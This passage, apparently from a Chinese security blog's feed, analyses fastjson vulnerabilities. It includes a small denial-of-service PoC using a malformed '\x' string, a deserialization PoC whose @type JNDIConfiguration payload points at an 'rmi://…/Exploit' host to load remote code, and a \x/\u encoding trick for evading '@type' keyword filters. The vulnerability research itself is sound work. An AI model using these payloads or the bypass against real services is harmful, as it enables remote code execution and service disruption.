&quot;&#123;\&quot;a\&quot;:\&quot;\\x&quot;;//输入字符串长度为8</span><br><span class="line">        JSON.parse(DEATH_STRING);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/02/01/XH6MOyIndgAazUu.jpg" alt="-w1047"></p><h2 id="漏洞分析-1"><a href="#漏洞分析-1" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>在这篇文章里介绍了fastjson解析json串的机制：<a href="https://zonghaishang.gitbooks.io/fastjson-source-code-analysis/content/lexer/lexer_part2.html" target="_blank" rel="noopener">fastjson源码解析：JSON Token解析</a>，这里我们记住<code>bp</code>为读取字符串的指针、<code>sp</code>为字符缓存区索引就好了:<br><img src="https://i.loli.net/2020/02/01/aZCNeRt87dbIxWK.jpg" alt="-w491"><br><img src="https://i.loli.net/2020/02/01/IAaUY47cdXhi5vJ.jpg" alt="-w513"></p><p>直接来看解析16进制的代码位置：/parser/JSONLexerBase.java#scanString<br><img src="https://i.loli.net/2020/02/01/bTxHlarRm3jFY91.jpg" alt="-w1432"></p><p>跟进<code>next</code>函数：JSONScanner.java#next()<br><img src="https://i.loli.net/2020/02/01/FN8qn5ctdGhai6R.jpg" alt="-w881"><br>先给索引指针进行了自增赋值，接着判断索引和实际长度的比较，如果索引比实际长度长或者相等则返回<code>EOI</code>,否则返回当前索引指向的字符：<br><img src="https://i.loli.net/2020/02/01/xdvDO7LKCX8zhIG.jpg" alt="-w480"><br>经过第一次的<code>next</code>处理，已经返回<code>EOI(0x1A)</code>了：<br><img src="https://i.loli.net/2020/02/01/m1JR3FkLyOMNqiI.jpg" alt="-w967"></p><p>但是他又调用了一次<code>next</code>(即默认信任用户输入<code>\x</code>后跟两位字符)，此时索引的指针<code>bp</code>为9了，已经越界了：<br><img src="https://i.loli.net/2020/02/01/cFEsqZAHXrbJ8hK.jpg" alt="-w914"></p><p>然后经过<code>putChar</code>函数，<code>break</code>了<code>switch</code>分支，继续进行这个循环：<br><img src="https://i.loli.net/2020/02/01/z8mGXYlgw5Ire1L.jpg" alt="-w1125"></p><p>跟进<code>isEOF</code>函数：JSONScanner.java#isEOF：<br><img src="https://i.loli.net/2020/02/01/Jw8ntRMlxCOGEWe.jpg" alt="-w1013"><br><code>bp+1</code>已经远大于len了，这个条件永远只能返回<code>false</code>。</p><p>跟进<code>putChar</code>函数，如果<code>sp</code>和缓存字符长度相对后，则申请一个<code>char</code>占用当前<code>sbuf.length</code>的两倍：<br><img src="https://i.loli.net/2020/02/01/M23WcdP9eHsNVfC.jpg" alt="-w920"><br>所以最后的结果就是进入一个死循环且成倍申请内存：<br><img src="https://i.loli.net/2020/02/01/fE3qtAvbSxk2WsL.jpg" alt="-w709"></p><h2 id="最后-1"><a href="#最后-1" class="headerlink" title="最后"></a>最后</h2><p>在新版本1.2.60中，修改了<code>isEOF</code>函数的判断条件：<br><img src="https://i.loli.net/2020/02/01/bTCiL7rKJkeX32g.jpg" alt="-w677"><br>并且增加了<code>x1</code>和<code>x2</code>的校验：<br><img src="https://i.loli.net/2020/02/01/1ISo2JAbzUKHNVX.jpg" alt="-w1043"></p><p>其次，在实际的测试中并没有理想中的拒绝服务效果，使用多线程占用也就从100多M涨到2.5G的样子。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.alibaba.fastjson.JSON;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">fastjsonDos</span> <span class="keyword">implements</span> <span class="title">Runnable</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> fastjsonDos()).start();</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> fastjsonDos()).start();</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> fastjsonDos()).start();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        String DEATH_STRING = <span class="string">"&#123;\"a\":\"\\x"</span>;</span><br><span class="line">        JSON.parse(DEATH_STRING);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2020/02/01/MWiutJRaxqD1NZH.jpg" alt="-w882"></p><p>后来学习到，java启动的时候可以通过<code>-Xmx</code>参数为jvm设置最大内存占用，默认为主机的四分之一。</p><p>其次Java的OutOfMemoryError是JVM内部的异常，是一个可捕获异常，并不会直接导致java进程被Kill掉，顶多线程挂掉。</p><p>在Linux下当应用程序内存超出内存上限时，会触发OOM Killer机制以保持系统空间正常运行，java默认最大1/4物理内存占用，还不太容易导致系统的OOM。</p><p>总的来说，漏洞危害有限，但是利用过程还是挺看细节的，有一些值得学习的点~</p><p>参考文章：</p><ul><li><a href="https://zonghaishang.gitbooks.io/fastjson-source-code-analysis/content/lexer/lexer_part2.html" target="_blank" rel="noopener">fastjson源码解析：JSON Token解析</a></li><li><a href="https://nosec.org/home/detail/2933.html" target="_blank" rel="noopener">FastJson拒绝服务漏洞分析</a></li><li><a href="https://blog.csdn.net/liukuan73/article/details/43238623" target="_blank" rel="noopener">Linux内核OOM机制的详细分析</a></li></ul>]]></content>
    
    <summary type="html">
    
      &lt;hr&gt;
    
    </summary>
    
      <category term="Web" scheme="http://0day.design/categories/Web/"/>
    
    
      <category term="Java" scheme="http://0day.design/tags/Java/"/>
    
      <category term="漏洞分析" scheme="http://0day.design/tags/%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/"/>
    
      <category term="fastjson" scheme="http://0day.design/tags/fastjson/"/>
    
  </entry>
  
  <entry>
    <title>fastjson 反序列化触发流程分析</title>
    <link href="http://0day.design/2020/01/30/fastjson%20%E8%A7%A6%E5%8F%91%E6%B5%81%E7%A8%8B%E5%88%86%E6%9E%90/"/>
    <id>http://0day.design/2020/01/30/fastjson 触发流程分析/</id>
    <published>2020-01-30T08:05:00.000Z</published>
    <updated>2020-01-31T10:46:59.902Z</updated>
    
    <content type="html"><![CDATA[<hr><a id="more"></a><p>跟了几个三方组件组合利用的gadget chain，一直没有去跟fastjson底层实现，不免有很多疑问之处，这里记录一下分析一下fastjson触发流程。</p><h2 id="fastjson-1-2-61-反序列化执行流程分析"><a href="#fastjson-1-2-61-反序列化执行流程分析" class="headerlink" title="fastjson 1.2.61 反序列化执行流程分析"></a>fastjson 1.2.61 反序列化执行流程分析</h2><p>接着上一篇文章<a href="https://xz.aliyun.com/t/7107" target="_blank" rel="noopener">fastjson 1.2.61 远程代码执行漏洞分析(commons-configuration gadget)</a>的poc出发：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exp</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">        String poc = <span class="string">"&#123;\"@type\":\"org.apache.commons.configuration2.JNDIConfiguration\",\"prefix\":\"rmi://127.0.0.1:1099/Exploit\"&#125;"</span>;</span><br><span class="line">        ParserConfig.global.setAutoTypeSupport(<span class="keyword">true</span>);</span><br><span class="line">        JSONObject exp = (JSONObject) JSON.parseObject(poc);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>下断点跟进POC中的<code>JSON.parseObject</code>函数：<br><img src="https://i.loli.net/2020/01/30/RXP8vCsbhZxENJI.jpg" alt="-w1427"></p><p>跟进<code>parse(String text)</code>函数，一顿套娃操作(java的重载特性：允许存在相同方法名，但不同参数个数及类型)<br>通过重载的特性，调用了三个<code>parse</code>函数:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 148</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">parse</span><span class="params">(String text)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> parse(text, DEFAULT_PARSER_FEATURE);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 179</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">parse</span><span class="params">(String text, <span class="keyword">int</span> features)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> parse(text, ParserConfig.getGlobalInstance(), features);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 164</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">parse</span><span class="params">(String text, ParserConfig config, <span class="keyword">int</span> features)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">if</span> (text == <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        DefaultJSONParser parser = <span class="keyword">new</span> DefaultJSONParser(text, config, features);</span><br><span class="line">        Object value = parser.parse();</span><br><span class="line">        parser.handleResovleTask(value);</span><br><span class="line">        parser.close();</span><br><span class="line">        <span class="keyword">return</span> value;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>在<code>DefaultJSONParser</code>函数中初始化了一些变量配置信息，确认起始标志位为<code>{</code>：<br><img src="https://i.loli.net/2020/01/30/Epokz5jByTlsZaU.jpg" alt="-w1223"><br><img src="https://i.loli.net/2020/01/30/WuZkJBNVDYFEo1q.jpg" alt="-w789"></p><p>接着进入<code>parser.parse</code>函数，解析json流程:<br><img src="https://i.loli.net/2020/01/30/h3d54wMBKY2H79i.jpg" alt="-w1057"></p><p>跟进DefaultJSONParser.java#parseObject，函数较长，截取部分：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (;;) &#123;</span><br><span class="line">                lexer.skipWhitespace();</span><br><span class="line">                <span class="keyword">char</span> ch = lexer.getCurrent();</span><br><span class="line">                <span class="keyword">if</span> (lexer.isEnabled(Feature.AllowArbitraryCommas)) &#123;</span><br><span class="line">                    <span class="keyword">while</span> (ch == <span class="string">','</span>) &#123;</span><br><span class="line">                        lexer.next();</span><br><span class="line">                        lexer.skipWhitespace();</span><br><span class="line">                        ch = lexer.getCurrent();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">boolean</span> isObjectKey = <span class="keyword">false</span>;</span><br><span class="line">                Object key;</span><br><span class="line">                <span class="keyword">if</span> (ch == <span class="string">'"'</span>) &#123;</span><br><span class="line">                    key = lexer.scanSymbol(symbolTable, <span class="string">'"'</span>);</span><br><span class="line">                    lexer.skipWhitespace();</span><br><span class="line">                    ch = lexer.getCurrent();</span><br><span class="line">                    <span class="keyword">if</span> (ch != <span class="string">':'</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"expect ':' at "</span> + lexer.pos() + <span class="string">", name "</span> + key);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">'&#125;'</span>) &#123;</span><br><span class="line">                    lexer.next();</span><br><span class="line">                    lexer.resetStringPosition();</span><br><span class="line">                    lexer.nextToken();</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (!setContextFlag) &#123;</span><br><span class="line">                        <span class="keyword">if</span> (<span class="keyword">this</span>.context != <span class="keyword">null</span> &amp;&amp; fieldName == <span class="keyword">this</span>.context.fieldName &amp;&amp; object == <span class="keyword">this</span>.context.object) &#123;</span><br><span class="line">                            context = <span class="keyword">this</span>.context;</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            ParseContext contextR = setContext(object, fieldName);</span><br><span class="line">                            <span class="keyword">if</span> (context == <span class="keyword">null</span>) &#123;</span><br><span class="line">                                context = contextR;</span><br><span class="line">                            &#125;</span><br><span class="line">                            setContextFlag = <span class="keyword">true</span>;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">return</span> object;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">'\''</span>) &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!lexer.isEnabled(Feature.AllowSingleQuotes)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"syntax error"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    key = lexer.scanSymbol(symbolTable, <span class="string">'\''</span>);</span><br><span class="line">                    lexer.skipWhitespace();</span><br><span class="line">                    ch = lexer.getCurrent();</span><br><span class="line">                    <span class="keyword">if</span> (ch != <span class="string">':'</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"expect ':' at "</span> + lexer.pos());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == EOI) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"syntax error"</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">','</span>) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"syntax error"</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> ((ch &gt;= <span class="string">'0'</span> &amp;&amp; ch &lt;= <span class="string">'9'</span>) || ch == <span class="string">'-'</span>) &#123;</span><br><span class="line">                    lexer.resetStringPosition();</span><br><span class="line">                    lexer.scanNumber();</span><br><span class="line">                    <span class="keyword">try</span> &#123;</span><br><span class="line">                        <span class="keyword">if</span> (lexer.token() == JSONToken.LITERAL_INT) &#123;</span><br><span class="line">                            key = lexer.integerValue();</span><br><span class="line">                        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                            key = lexer.decimalValue(<span class="keyword">true</span>);</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">if</span> (lexer.isEnabled(Feature.NonStringKeyAsString)) &#123;</span><br><span class="line">                            key = key.toString();</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125; <span class="keyword">catch</span> (NumberFormatException e) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"parse number key error"</span> + lexer.info());</span><br><span class="line">                    &#125;</span><br><span class="line">                    ch = lexer.getCurrent();</span><br><span class="line">                    <span class="keyword">if</span> (ch != <span class="string">':'</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"parse number key error"</span> + lexer.info());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">else</span> <span class="keyword">if</span> (ch == <span class="string">'&#123;'</span> || ch == <span class="string">'['</span>) &#123;</span><br><span class="line">                    lexer.nextToken();</span><br><span class="line">                    key = parse();</span><br><span class="line">                    isObjectKey = <span class="keyword">true</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (!lexer.isEnabled(Feature.AllowUnQuotedFieldNames)) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"syntax error"</span>);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    key = lexer.scanSymbolUnQuoted(symbolTable);</span><br><span class="line">                    lexer.skipWhitespace();</span><br><span class="line">                    ch = lexer.getCurrent();</span><br><span class="line">                    <span class="keyword">if</span> (ch != <span class="string">':'</span>) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"expect ':' at "</span> + lexer.pos() + <span class="string">", actual "</span> + ch);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">                </span><br><span class="line"><span class="comment">//...</span></span><br></pre></td></tr></table></figure></p><p>总的来说就是一个大循环，里边嵌套了一堆if else，然后依据类型来判断，直到迭代器遍历完json数据为止，比如下面这个就是检测数字的判断：<br><img src="https://i.loli.net/2020/01/30/2TtSQelf7FjwcMi.jpg" alt="-w994"><br>再比如这里，匹配到双引号，则用<code>lexer.scanSymbol</code>函数去获取双引号中间的值，并设置键名：<br><img src="https://i.loli.net/2020/01/30/QjY8JUBPR3Gy9Ov.jpg" alt="-w1178"></p><p>再来看这里，进行了特殊键<code>@type</code>匹配，并且<code>!lexer.isEnabled(Feature.DisableSpecialKeyDetect)</code>默认也是<code>true</code><br><img src="https://i.loli.net/2020/01/30/U5ZnBIWNpaJcRML.jpg" alt="-w1331"><br><img src="https://i.loli.net/2020/01/30/LjTFdu3U9MaNCAR.jpg" alt="-w900"><br>跟进<code>lexer.scanSymbol(symbolTable, &#39;&quot;&#39;)</code>函数，看看它是如何获取类型名<code>typeName</code>的，JSONLexerBase.java#scanSymbol，同样的，也是一个迭代判断的过程，这里看一段比较有意思的是这一段代码：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (chLocal == <span class="string">'\\'</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span> (!hasSpecial) &#123;</span><br><span class="line">                    hasSpecial = <span class="keyword">true</span>;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (sp &gt;= sbuf.length) &#123;</span><br><span class="line">                        <span class="keyword">int</span> newCapcity = sbuf.length * <span class="number">2</span>;</span><br><span class="line">                        <span class="keyword">if</span> (sp &gt; newCapcity) &#123;</span><br><span class="line">                            newCapcity = sp;</span><br><span class="line">                        &#125;</span><br><span class="line">                        <span class="keyword">char</span>[] newsbuf = <span class="keyword">new</span> <span class="keyword">char</span>[newCapcity];</span><br><span class="line">                        System.arraycopy(sbuf, <span class="number">0</span>, newsbuf, <span class="number">0</span>, sbuf.length);</span><br><span class="line">                        sbuf = newsbuf;</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="comment">// text.getChars(np + 1, np + 1 + sp, sbuf, 0);</span></span><br><span class="line">                    <span class="comment">// System.arraycopy(this.buf, np + 1, sbuf, 0, sp);</span></span><br><span class="line">                    arrayCopy(np + <span class="number">1</span>, sbuf, <span class="number">0</span>, sp);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                chLocal = next();</span><br><span class="line"></span><br><span class="line">                <span class="keyword">switch</span> (chLocal) &#123;</span><br><span class="line">                         <span class="comment">// 省略大量case</span></span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'\\'</span>: <span class="comment">// 92</span></span><br><span class="line">                        hash = <span class="number">31</span> * hash + (<span class="keyword">int</span>) <span class="string">'\\'</span>;</span><br><span class="line">                        putChar(<span class="string">'\\'</span>);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'x'</span>:</span><br><span class="line">                        <span class="keyword">char</span> x1 = ch = next();</span><br><span class="line">                        <span class="keyword">char</span> x2 = ch = next();</span><br><span class="line"></span><br><span class="line">                        <span class="keyword">int</span> x_val = digits[x1] * <span class="number">16</span> + digits[x2];</span><br><span class="line">                        <span class="keyword">char</span> x_char = (<span class="keyword">char</span>) x_val;</span><br><span class="line">                        hash = <span class="number">31</span> * hash + (<span class="keyword">int</span>) x_char;</span><br><span class="line">                        putChar(x_char);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">case</span> <span class="string">'u'</span>:</span><br><span class="line">                        <span class="keyword">char</span> c1 = chLocal = next();</span><br><span class="line">                        <span class="keyword">char</span> c2 = chLocal = next();</span><br><span class="line">                        <span class="keyword">char</span> c3 = chLocal = next();</span><br><span class="line">                        <span class="keyword">char</span> c4 = chLocal = next();</span><br><span class="line">                        <span class="keyword">int</span> val = Integer.parseInt(<span class="keyword">new</span> String(<span class="keyword">new</span> <span class="keyword">char</span>[] &#123; c1, c2, c3, c4 &#125;), <span class="number">16</span>);</span><br><span class="line">                        hash = <span class="number">31</span> * hash + val;</span><br><span class="line">                        putChar((<span class="keyword">char</span>) val);</span><br><span class="line">                        <span class="keyword">break</span>;</span><br><span class="line">                    <span class="keyword">default</span>:</span><br><span class="line">                        <span class="keyword">this</span>.ch = chLocal;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> JSONException(<span class="string">"unclosed.str.lit"</span>);</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">continue</span>;</span><br><span class="line">            &#125;</span><br></pre></td></tr></table></figure></p><p>这段代码处理了以<code>\x</code>和<code>\u</code>开头的16进制字符串，也就是说我们可以用这种方式去编码转换<code>typeName</code>，也就是<code>@type</code>的value组件名<br><img src="https://i.loli.net/2020/01/30/ty3MHIwfaiUeLh4.jpg" alt="-w1329"><br>再验证一下这个结果，将org的o进行编码：<br><img src="https://i.loli.net/2020/01/30/zNo5at2C4mIVg76.jpg" alt="-w1455"></p><p>再试试将<code>@type</code>的<code>@</code>进行编码都是可行的<br><img src="https://i.loli.net/2020/01/30/QOPUioYxEuazBt5.jpg" alt="-w1316"></p><p>因为在获取key值时，也是通过<code>lexer.scanSymbol</code>获取的(DefaultJSONParser.java#219行)<br><img src="https://i.loli.net/2020/01/30/rviTXqeoKPaSu1L.jpg" alt="-w939"></p><blockquote><p>所以说，如果在开发代码中过滤了关键字<code>@type</code>或者组件名，可以用这个方法进行绕过</p></blockquote><p>其后，在各种解码操作完成之后，在DefaultJSONParser.java#327行对其进行了AutoType校验：<br><img src="https://i.loli.net/2020/01/30/K3yRaC2j5d8NevY.jpg" alt="-w1147"></p><p>ParserConfig.java#checkAutoType<br><img src="https://i.loli.net/2020/01/30/7mnQw85gfROMXtK.jpg" alt="-w1322"><br>经过长度、预期class、是否开启autotype等判断后，进行<code>className</code>的hash计算，先有一个白名单，接着判断是否在黑名单hash里。</p><blockquote><p>为了防止安全研究者研究，fastjson 从1.2.42开始，将明文的黑名单换成了哈希过的黑名单，不过github上的大牛fuzz出了一份清单<a href="https://github.com/LeadroyaL/fastjson-blacklist" target="_blank" rel="noopener">https://github.com/LeadroyaL/fastjson-blacklist</a></p></blockquote><p>在<code>TypeUtils.loadClass</code>第三个参数为<code>true</code>时，会缓存到Mapping：<br><img src="https://i.loli.net/2020/01/30/BAOfhFbjIvLrGCK.jpg" alt="-w1354"><br><code>loadClass</code>函数，第三参数为<code>cache</code>为<code>true</code>时，则<code>mappings.put(className, clazz);</code>进行缓存。<br>TypeUtils.java#loadClass<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, <span class="keyword">boolean</span> cache) &#123;</span><br><span class="line">    <span class="keyword">if</span>(className == <span class="keyword">null</span> || className.length() == <span class="number">0</span> || className.length() &gt; <span class="number">128</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    Class&lt;?&gt; clazz = mappings.get(className);</span><br><span class="line">    <span class="keyword">if</span>(clazz != <span class="keyword">null</span>)&#123;</span><br><span class="line">        <span class="keyword">return</span> clazz;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(className.charAt(<span class="number">0</span>) == <span class="string">'['</span>)&#123;</span><br><span class="line">        Class&lt;?&gt; componentType = loadClass(className.substring(<span class="number">1</span>), classLoader);</span><br><span class="line">        <span class="keyword">return</span> Array.newInstance(componentType, <span class="number">0</span>).getClass();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(className.startsWith(<span class="string">"L"</span>) &amp;&amp; className.endsWith(<span class="string">";"</span>))&#123;</span><br><span class="line">        String newClassName = className.substring(<span class="number">1</span>, className.length() - <span class="number">1</span>);</span><br><span class="line">        <span class="keyword">return</span> loadClass(newClassName, classLoader);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>&#123;</span><br><span class="line">        <span 